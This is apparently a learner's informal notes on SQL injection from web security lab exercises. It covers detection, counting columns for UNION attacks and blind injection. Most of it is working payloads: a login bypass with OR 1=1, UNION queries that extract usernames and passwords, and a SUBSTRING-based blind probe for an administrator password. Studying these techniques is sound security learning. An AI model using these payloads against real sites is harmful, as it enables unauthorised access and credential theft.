detect:
simple '
adding logic after ' and --
time based
OAST


union based attacks:
the number and type of columns you add must be the same as the original query

determining the numner of columns:
1. use ' ORDER BY 1-- and increment numbers untill you see out of index error
index begins from 1
2. use ' UNION SELECT NULL--
if !match error
else null inside tows or 
NullPointerException

' ORDER BY 1--
returns error when you use a number over the rows
' UNION SELECT NULL,NULL,NULL--
returns additional row with NULL when NULLs match

tricks:
administrator' OR 1=1--

' ORDER BY 1--
' UNION SELECT NULL,NULL,NULL--

attack would look like this:
' UNION SELECT USER,PASS FROM users--

' UNION SELECT NULL,USER || PASS FROM users--

/filter?category=P'UNION SELECT NULL,password_mwoxri FROM users_iktcia--

/filter?category=P'UNION SELECT NULL,TABLE_NAME FROM information_schema.columns WHERE COLUMN_NAME = 'rolbypassrls'--

if only one column is a string you can concat columns like this:


blind:
TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a




tips:
in oracle you gotta have the from in select
in mysql you have to put %20 for a space after the comments!
after select there is always a column name
after from is always a table name
where column name = something


a hard lesson i learned after 2 hours is that spaces and little syntax quirks influence the shit out of the result
untill you dont have  a letter = thing you can not be sure
